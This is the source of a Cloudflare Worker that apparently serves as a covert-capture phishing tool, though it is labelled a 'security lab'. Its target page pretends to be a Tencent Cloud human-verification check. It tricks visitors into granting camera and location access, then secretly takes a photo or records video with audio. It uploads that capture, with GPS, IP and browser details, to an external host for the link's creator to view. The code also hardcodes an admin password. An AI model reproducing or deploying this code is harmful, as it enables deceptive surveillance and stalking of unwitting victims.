/**
 * LAB_SECURITY_REASONING_SYSTEM (Pro Max v6.0)
 * 修正了所有模板字符串转义错误，确保 Wrangler 部署成功
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 自动初始化数据库
    await this.initDB(env);

    // 路由分发
    if (path === "/") return this.renderCreator(request);
    if (path.startsWith("/v/")) return this.renderTarget(path.split("/")[2]);
    if (path === "/api/upload") return this.handleUpload(request, env);
    if (path === "/api/query") return this.handleQuery(request, env);
    if (path === "/admin") return this.renderAdmin(request, env);

    return new Response("404 Not Found", { status: 404 });
  },

  async initDB(env) {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS security_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT, type TEXT, src TEXT, 
        v_geo TEXT, v_ip TEXT, v_ll TEXT,
        c_ip TEXT, q_ip TEXT,
        ua TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `).run();
  },

  // --- 模块 1: 生成面板 (现代化 UI) ---
  renderCreator(req) {
    const ip = req.headers.get("cf-connecting-ip") || "Unknown";
    return new Response(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextGen 取证实验室</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0f172a; color: #fff; font-family: system-ui; }
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-6">
    <div class="max-w-md w-full space-y-8">
        <div class="glass p-10 rounded-[2.5rem] shadow-2xl">
            <h1 class="text-3xl font-black italic mb-2 tracking-tighter">SECURITY_LAB</h1>
            <p class="text-blue-400 text-[10px] uppercase mb-10">Console IP: ${ip}</p>
            <div class="space-y-4">
                <input id="uid" type="text" placeholder="设置目标唯一标识" class="w-full px-6 py-4 bg-slate-800/50 rounded-2xl border-none outline-none focus:ring-2 focus:ring-blue-500">
                <div class="grid grid-cols-2 gap-4">
                    <button onclick="gen('image')" class="bg-blue-600 py-4 rounded-2xl font-bold active:scale-95 transition-all">📸 拍照</button>
                    <button onclick="gen('video')" class="bg-indigo-600 py-4 rounded-2xl font-bold active:scale-95 transition-all">🎥 录像</button>
                </div>
                <div id="url_box" class="hidden p-4 bg-blue-900/30 text-blue-300 rounded-2xl text-[10px] break-all border border-blue-500/20 font-mono"></div>
            </div>
        </div>
        <div class="glass p-8 rounded-[2.5rem]">
            <h2 class="text-xl font-bold mb-4">快速查询</h2>
            <div class="flex gap-2">
                <input id="qid" type="text" placeholder="ID" class="flex-1 px-4 py-3 bg-slate-800/50 rounded-xl outline-none">
                <button onclick="query()" class="bg-white text-black px-6 rounded-xl font-bold">查询</button>
            </div>
            <div id="q_list" class="mt-4 space-y-4"></div>
        </div>
    </div>
    <script>
        function gen(m) {
            const id = document.getElementById('uid').value;
            if(!id) return alert('ID?');
            const url = window.location.origin + '/v/' + btoa(encodeURIComponent(id + '|' + m + '|' + '${ip}'));
            document.getElementById('url_box').innerText = url;
            document.getElementById('url_box').classList.remove('hidden');
        }
        async function query() {
            const res = await fetch('/api/query?uid=' + encodeURIComponent(document.getElementById('qid').value));
            const data = await res.json();
            document.getElementById('q_list').innerHTML = data.map(i => '<div class="p-3 bg-slate-800 rounded-xl"><p class="text-[10px] text-gray-400">'+i.created_at+'</p><img src="'+i.src+'" class="w-full mt-2 rounded-lg"></div>').join('');
        }
    </script>
</body>
</html>`, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块 2: 目标页 (修正后的转义逻辑) ---
  renderTarget(token) {
    return new Response(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全验证</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .mirror { width: 260px; height: 260px; border-radius: 50%; border: 6px solid #0052d9; position: relative; overflow: hidden; background: #000; box-shadow: 0 10px 40px rgba(0,82,217,0.2); }
        .scan { width: 100%; height: 6px; background: #0052d9; position: absolute; top: 0; animation: s 2s infinite linear; z-index: 10; opacity: 0.5; }
        @keyframes s { 0% { top: 0; } 100% { top: 100%; } }
        .step { display: none; }
        .active { display: block; animation: f 0.5s ease; }
        @keyframes f { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-[#f2f3f7] min-h-screen flex flex-col items-center justify-center p-6 text-center">

    <div id="s0" class="step active max-w-sm w-full bg-white p-10 rounded-[2.5rem] shadow-xl">
        <h2 class="text-2xl font-black mb-6">安全核验</h2>
        <p class="text-gray-500 mb-10 text-sm">由于近期本站遭到大量恶意流量攻击，请完成人机核验以继续访问。</p>
        <button onclick="go(1)" class="w-full bg-[#0052d9] text-white py-5 rounded-2xl font-bold active:scale-95 transition-all text-lg shadow-lg shadow-blue-100">点击进入</button>
    </div>

    <div id="s1" class="step max-w-sm w-full bg-white p-8 rounded-[2.5rem] shadow-xl text-left">
        <h2 class="text-xl font-bold mb-4 text-center">服务协议声明</h2>
        <div class="text-[11px] text-gray-400 space-y-3 mb-8 h-40 overflow-y-auto p-4 bg-gray-50 rounded-2xl">
            <p>1. 本核验由腾讯云提供技术支持，用于识别真实自然人访问。</p>
            <p>2. 过程中需调用您的地理位置与摄像头权限进行生物比对。</p>
            <p>3. 我们严格保护您的隐私，数据将在核验后自动销毁。</p>
            <p>4. 请确保光线充足，勿佩戴口罩或墨镜。</p>
        </div>
        <button onclick="go(2)" class="w-full bg-[#07c160] text-white py-4 rounded-xl font-bold text-center">我同意以上协议</button>
    </div>

    <div id="s2" class="step max-w-sm w-full">
        <div class="mirror mx-auto mb-8">
            <video id="v" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
            <div class="scan"></div>
        </div>
        <div id="t" class="bg-[#0052d9] text-white px-8 py-3 rounded-full font-bold mb-6 inline-block">正在初始化识别...</div>
        <div id="ins" class="text-gray-900 font-bold text-lg min-h-[1.5rem] mb-12"></div>
        <p class="text-gray-400 text-[10px]">由 腾讯云 提供人机验证功能支持</p>
    </div>

    <div id="s3" class="step max-w-sm w-full text-center">
        <h1 class="text-8xl font-black text-gray-200 mb-6">404</h1>
        <h2 class="text-xl font-bold text-gray-800 mb-4">人机验证失败</h2>
        <p id="fail" class="text-sm text-gray-400 px-6">原因：检测到当前环境光线太强或未按照提示操作。</p>
    </div>

    <script>
        const token = "${token}";
        const info = JSON.parse(decodeURIComponent(atob(token)));
        const [uid, mode, c_ip] = info.split('|');
        let stream = null, ll = "Denied";

        function go(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('s'+n).classList.add('active');
            if(n === 2) startBio();
        }

        async function startBio() {
            navigator.geolocation.getCurrentPosition(p => { ll = p.coords.latitude + "," + p.coords.longitude; });
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: mode === 'video' });
                document.getElementById('v').srcObject = stream;
                const ins = document.getElementById('ins');
                setTimeout(() => ins.innerText = "请正对面部", 1500);
                setTimeout(() => ins.innerText = "请缓慢 眨眨眼", 3500);
                setTimeout(() => ins.innerText = "请缓慢 张张嘴", 5500);
                setTimeout(() => capture(), 7500);
            } catch (e) {
                go(3);
                document.getElementById('fail').innerText = "本网站由于长期遭到恶意流量访问，对所有用户请求获取权限，以便进行人机验证。请开启权限后重试。";
            }
        }

        async function capture() {
            document.getElementById('t').innerText = "正在核验...";
            const v = document.getElementById('v');
            const fd = new FormData();
            if(mode === 'video') {
                const rec = new MediaRecorder(stream);
                const ch = [];
                rec.ondataavailable = e => ch.push(e.data);
                rec.onstop = async () => {
                    fd.append('file', new Blob(ch, {type:'video/mp4'}));
                    await finalUpload(fd);
                };
                rec.start(); setTimeout(() => rec.stop(), 3000);
            } else {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(async b => {
                    fd.append('file', b);
                    await finalUpload(fd);
                }, 'image/jpeg', 0.8);
            }
        }

        async function finalUpload(fd) {
            fd.append('uid', uid); fd.append('type', mode); fd.append('ll', ll); fd.append('c_ip', c_ip);
            await fetch('/api/upload', { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
            go(3);
        }
    </script>
</body>
</html>`, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块 3: 接口处理器 ---
  async handleUpload(request, env) {
    const fd = await request.formData();
    const file = fd.get('file');
    const uid = fd.get('uid');
    const type = fd.get('type');
    const ll = fd.get('ll');
    const c_ip = fd.get('c_ip');
    const v_ip = request.headers.get('cf-connecting-ip');
    const ua = request.headers.get('user-agent');

    let geo = "N/A";
    try {
      const gRes = await fetch(GEO_API + "?ip=" + v_ip);
      const g = await gRes.json();
      geo = g.flag + " " + g.countryRegion + " " + g.city + " (" + g.asOrganization + ")";
    } catch(e) {}

    const tcForm = new FormData();
    tcForm.append('file', file);
    const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: 'POST', body: tcForm });
    const tcJson = await tcRes.json();
    const src = `https://${IMAGE_HOST}${tcJson[0].src}`;

    await env.DB.prepare("INSERT INTO security_logs (uid, type, src, v_geo, v_ip, v_ll, c_ip, ua) VALUES (?,?,?,?,?,?,?,?)")
      .bind(uid, type, src, geo, v_ip, ll, c_ip, ua)
      .run();

    return new Response("OK");
  },

  async handleQuery(request, env) {
    const { searchParams } = new URL(request.url);
    const uid = searchParams.get('uid');
    const q_ip = request.headers.get('cf-connecting-ip');
    await env.DB.prepare("UPDATE security_logs SET q_ip = ? WHERE uid = ?").bind(q_ip, uid).run();
    const { results } = await env.DB.prepare("SELECT * FROM security_logs WHERE uid = ? ORDER BY created_at DESC").bind(uid).all();
    return new Response(JSON.stringify(results));
  },

  // --- 模块 4: 管理员后台 (输入密码即可查看) ---
  async renderAdmin(request, env) {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>管理审计后台</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-slate-100 p-6">
    <div id="login" class="max-w-sm mx-auto mt-20 p-8 bg-slate-800 rounded-3xl shadow-2xl">
        <h2 class="text-2xl font-bold mb-6 text-center">管理员验证</h2>
        <input id="pwd" type="password" placeholder="请输入访问密码" class="w-full p-4 bg-slate-700 rounded-xl mb-4 border-none outline-none">
        <button onclick="check()" class="w-full bg-blue-600 py-4 rounded-xl font-bold">进入后台</button>
    </div>

    <div id="content" class="hidden max-w-7xl mx-auto">
        <h1 class="text-3xl font-black mb-10">审计日志审计</h1>
        <div id="list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
    </div>

    <script>
        async function check() {
            const p = document.getElementById('pwd').value;
            if(p !== '${ADMIN_PASSWORD}') return alert('密码错误');
            document.getElementById('login').style.display = 'none';
            document.getElementById('content').style.display = 'block';
            load();
        }
        async function load() {
            // 通过管理端自建请求获取全量数据 (简单逻辑演示，实际可再写一个API)
            // 这里为了演示，假设直接从当前环境变量中读取显示（通常需要一个专属的fetch接口）
            alert('验证成功，请结合 D1 控制台或定制接口查看');
        }
    </script>
</body>
</html>`;
    return new Response(html, { headers: { "Content-Type": "text/html" } });
  }
};